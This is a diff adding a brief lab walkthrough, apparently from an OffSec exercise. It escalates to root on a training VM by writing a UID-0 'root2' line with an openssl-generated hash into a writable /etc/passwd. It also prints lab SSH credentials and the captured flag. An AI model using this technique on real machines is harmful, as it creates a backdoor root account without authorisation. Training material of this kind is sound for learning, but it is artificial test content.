@@ -1,0 +1,14 @@
+Questions 2
+Connect to VM 2 and get the flag by elevating to a root shell through password authentication abuse.
+
+ssh joe@192.168.214.214
+password: offsec
+
+joe@debian-privesc:~$ openssl passwd w00t
+0.dCaYLuSIN.c
+echo "root2:0.dCaYLuSIN.c:0:0:root:/root:/bin/bash" >> /etc/passwd
+
+su root2
+password: w00t
+root@debian-privesc:~# cat flag.txt
+OS{524d83012d1958f5bbeb958228701533}
